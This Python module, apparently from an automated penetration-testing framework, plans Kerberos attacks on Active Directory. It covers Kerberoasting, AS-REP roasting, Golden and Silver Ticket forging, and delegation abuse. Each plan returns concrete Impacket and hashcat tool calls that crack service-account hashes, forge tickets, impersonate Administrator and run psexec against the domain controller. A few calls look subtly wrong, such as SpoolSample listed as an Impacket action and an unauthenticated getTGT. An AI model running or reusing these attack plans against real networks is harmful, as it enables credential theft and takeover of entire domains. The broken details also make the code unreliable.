"""
Kerberos Attack Planner

Plans Kerberos-based attacks: Kerberoasting, AS-REP Roasting,
Golden Ticket, Silver Ticket, and Delegation attacks.  Each method
returns the required tool calls (Impacket/CrackMapExec commands)
with prerequisites and risk assessment.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from core.logging import get_logger

logger = get_logger(__name__)


@dataclass
class KerberosAttackPlan:
    """A planned Kerberos attack with tool calls and prerequisites."""
    attack_type: str
    description: str
    tool_calls: list[dict[str, Any]]
    prerequisites: list[str]
    risk_level: str
    mitre_technique: str
    success_indicators: list[str]
    cleanup_steps: list[str] = field(default_factory=list)


class KerberosAttackPlanner:
    """
    Plans Kerberos-based attacks for Active Directory environments.

    Each method returns a ``KerberosAttackPlan`` with:
    - Tool name and arguments
    - Prerequisites that must be met
    - Risk level and MITRE technique mapping
    - Success indicators to verify the attack worked
    """

    # ------------------------------------------------------------------
    # Kerberoasting
    # ------------------------------------------------------------------

    def plan_kerberoast(
        self,
        domain: str,
        dc_ip: str,
        username: str | None = None,
        password: str | None = None,
        target_spn: str | None = None,
    ) -> KerberosAttackPlan:
        """
        Plan a Kerberoasting attack to extract service account TGS tickets.
        """
        tool_calls: list[dict[str, Any]] = []

        # Step 1: Enumerate SPNs
        tool_calls.append({
            "tool": "impacket",
            "action": "GetUserSPNs",
            "args": {
                "domain": domain,
                "dc_ip": dc_ip,
                "username": username or "",
                "password": password or "",
                "request": True,
                "output_file": f"/tmp/kerberoast_{domain}.txt",
            },
        })

        # Step 2: Crack with hashcat if hashes obtained
        tool_calls.append({
            "tool": "hashcat",
            "action": "crack",
            "args": {
                "hash_file": f"/tmp/kerberoast_{domain}.txt",
                "mode": "13100",  # Kerberos 5 TGS-REP etype 23
                "wordlist": "/usr/share/wordlists/rockyou.txt",
            },
        })

        prereqs = ["Valid domain credentials (low-priv OK)", "Network access to DC"]
        if target_spn:
            prereqs.append(f"Target SPN: {target_spn}")

        return KerberosAttackPlan(
            attack_type="kerberoast",
            description=f"Kerberoasting attack against {domain} to extract service account hashes",
            tool_calls=tool_calls,
            prerequisites=prereqs,
            risk_level="medium",
            mitre_technique="T1558.003",
            success_indicators=[
                "TGS-REP hashes extracted",
                "Service account passwords cracked",
            ],
        )

    # ------------------------------------------------------------------
    # AS-REP Roasting
    # ------------------------------------------------------------------

    def plan_asrep_roast(
        self,
        domain: str,
        dc_ip: str,
        user_list: list[str] | None = None,
    ) -> KerberosAttackPlan:
        """
        Plan an AS-REP Roasting attack against accounts without
        Kerberos pre-authentication.
        """
        tool_calls: list[dict[str, Any]] = []

        # Step 1: Find accounts without pre-auth
        tool_calls.append({
            "tool": "impacket",
            "action": "GetNPUsers",
            "args": {
                "domain": domain,
                "dc_ip": dc_ip,
                "no_pass": True,
                "users_file": "/tmp/users.txt" if user_list else None,
                "output_file": f"/tmp/asrep_{domain}.txt",
            },
        })

        # Step 2: Crack AS-REP hashes
        tool_calls.append({
            "tool": "hashcat",
            "action": "crack",
            "args": {
                "hash_file": f"/tmp/asrep_{domain}.txt",
                "mode": "18200",  # Kerberos 5 AS-REP etype 23
                "wordlist": "/usr/share/wordlists/rockyou.txt",
            },
        })

        return KerberosAttackPlan(
            attack_type="asrep_roast",
            description=f"AS-REP Roasting against {domain} (pre-auth disabled accounts)",
            tool_calls=tool_calls,
            prerequisites=[
                "User list or LDAP enumeration access",
                "Network access to DC",
            ],
            risk_level="low",
            mitre_technique="T1558.004",
            success_indicators=[
                "AS-REP hashes extracted for accounts without pre-auth",
                "Account passwords cracked",
            ],
        )

    # ------------------------------------------------------------------
    # Golden Ticket
    # ------------------------------------------------------------------

    def plan_golden_ticket(
        self,
        domain: str,
        dc_ip: str,
        domain_sid: str,
        krbtgt_hash: str,
        target_user: str = "Administrator",
    ) -> KerberosAttackPlan:
        """
        Plan a Golden Ticket attack for domain-wide persistence.
        Requires the krbtgt NTLM hash (from DCSync or NTDS.dit).
        """
        tool_calls: list[dict[str, Any]] = [
            {
                "tool": "impacket",
                "action": "ticketer",
                "args": {
                    "domain": domain,
                    "domain_sid": domain_sid,
                    "nthash": krbtgt_hash,
                    "user_id": "500",
                    "target_user": target_user,
                    "output_file": f"/tmp/golden_{domain}.ccache",
                },
            },
            {
                "tool": "impacket",
                "action": "psexec",
                "args": {
                    "target": dc_ip,
                    "ticket": f"/tmp/golden_{domain}.ccache",
                    "no_pass": True,
                },
            },
        ]

        return KerberosAttackPlan(
            attack_type="golden_ticket",
            description=f"Golden Ticket attack for domain-wide access to {domain}",
            tool_calls=tool_calls,
            prerequisites=[
                "krbtgt NTLM hash (from DCSync or NTDS.dit extraction)",
                f"Domain SID: {domain_sid}",
                "Network access to DC",
            ],
            risk_level="critical",
            mitre_technique="T1558.001",
            success_indicators=[
                "Golden ticket generated successfully",
                "Access to DC with forged ticket",
                "Domain Admin level access confirmed",
            ],
            cleanup_steps=[
                "Delete .ccache ticket file",
                "Consider krbtgt password reset (double rotation)",
            ],
        )

    # ------------------------------------------------------------------
    # Silver Ticket
    # ------------------------------------------------------------------

    def plan_silver_ticket(
        self,
        domain: str,
        domain_sid: str,
        service_hash: str,
        target_spn: str,
        target_user: str = "Administrator",
    ) -> KerberosAttackPlan:
        """
        Plan a Silver Ticket attack for service-level access.
        Requires the target service account's NTLM hash.
        """
        tool_calls: list[dict[str, Any]] = [
            {
                "tool": "impacket",
                "action": "ticketer",
                "args": {
                    "domain": domain,
                    "domain_sid": domain_sid,
                    "nthash": service_hash,
                    "spn": target_spn,
                    "target_user": target_user,
                    "output_file": f"/tmp/silver_{target_spn.replace('/', '_')}.ccache",
                },
            },
        ]

        return KerberosAttackPlan(
            attack_type="silver_ticket",
            description=f"Silver Ticket for {target_spn} on {domain}",
            tool_calls=tool_calls,
            prerequisites=[
                f"Service account NTLM hash for {target_spn}",
                f"Domain SID: {domain_sid}",
                "Network access to target service",
            ],
            risk_level="high",
            mitre_technique="T1558.002",
            success_indicators=[
                "Silver ticket generated",
                f"Access to {target_spn} with forged ticket",
            ],
            cleanup_steps=[
                "Delete .ccache ticket file",
                "Rotate service account password",
            ],
        )

    # ------------------------------------------------------------------
    # Delegation Attack
    # ------------------------------------------------------------------

    def plan_delegation_attack(
        self,
        domain: str,
        dc_ip: str,
        delegation_type: str,
        compromised_account: str,
        compromised_hash: str,
        target_spn: str | None = None,
    ) -> KerberosAttackPlan:
        """
        Plan a Kerberos delegation attack (unconstrained, constrained, RBCD).
        """
        tool_calls: list[dict[str, Any]] = []

        if delegation_type == "unconstrained":
            # Monitor for incoming TGTs
            tool_calls.append({
                "tool": "impacket",
                "action": "SpoolSample",
                "args": {
                    "domain": domain,
                    "target": dc_ip,
                    "listener": compromised_account,
                },
            })
            tool_calls.append({
                "tool": "impacket",
                "action": "getTGT",
                "args": {
                    "domain": domain,
                    "dc_ip": dc_ip,
                },
            })
            description = f"Unconstrained delegation abuse via {compromised_account}"
            risk = "critical"

        elif delegation_type == "constrained":
            tool_calls.append({
                "tool": "impacket",
                "action": "getST",
                "args": {
                    "domain": domain,
                    "dc_ip": dc_ip,
                    "spn": target_spn or "",
                    "impersonate": "Administrator",
                    "hashes": compromised_hash,
                },
            })
            description = f"Constrained delegation abuse via {compromised_account} to {target_spn}"
            risk = "high"

        elif delegation_type == "rbcd":
            tool_calls.append({
                "tool": "impacket",
                "action": "rbcd",
                "args": {
                    "domain": domain,
                    "dc_ip": dc_ip,
                    "delegate_to": target_spn or "",
                    "delegate_from": compromised_account,
                    "hashes": compromised_hash,
                    "action": "write",
                },
            })
            tool_calls.append({
                "tool": "impacket",
                "action": "getST",
                "args": {
                    "domain": domain,
                    "dc_ip": dc_ip,
                    "spn": f"cifs/{target_spn}" if target_spn else "",
                    "impersonate": "Administrator",
                    "hashes": compromised_hash,
                },
            })
            description = f"RBCD abuse: {compromised_account} → {target_spn}"
            risk = "high"
        else:
            description = f"Unknown delegation type: {delegation_type}"
            risk = "high"

        return KerberosAttackPlan(
            attack_type=f"delegation_{delegation_type}",
            description=description,
            tool_calls=tool_calls,
            prerequisites=[
                f"Compromised account: {compromised_account}",
                f"Account hash: {'provided' if compromised_hash else 'required'}",
                "Network access to DC",
            ],
            risk_level=risk,
            mitre_technique="T1550.003",
            success_indicators=[
                "Service ticket obtained via delegation",
                "Access to target service confirmed",
            ],
        )
